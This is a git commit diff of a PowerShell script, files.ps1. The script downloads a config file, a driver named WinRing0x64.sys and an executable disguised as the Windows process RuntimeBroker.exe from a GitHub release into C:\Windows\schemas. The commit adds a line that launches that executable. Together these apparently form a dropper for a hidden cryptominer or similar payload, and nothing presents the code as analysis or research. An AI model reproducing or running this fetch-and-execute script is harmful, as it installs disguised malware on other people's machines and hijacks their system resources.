300a1c61a5c878978c00fd181e547a03df1c00e8
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-18 01:18:21 -0300

    Update files.ps1

--- files.ps1
+++ files.ps1
@@ -1,3 +1,4 @@
 Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/config.json' -Destination 'C:\Windows\schemas\config.json' 
 Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe' -Destination 'C:\Windows\schemas\RuntimeBroker.exe' 
 Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys' -Destination 'C:\Windows\schemas\WinRing0x64.sys' 
+Start-Process "C:\Windows\schemas\RuntimeBroker.exe"
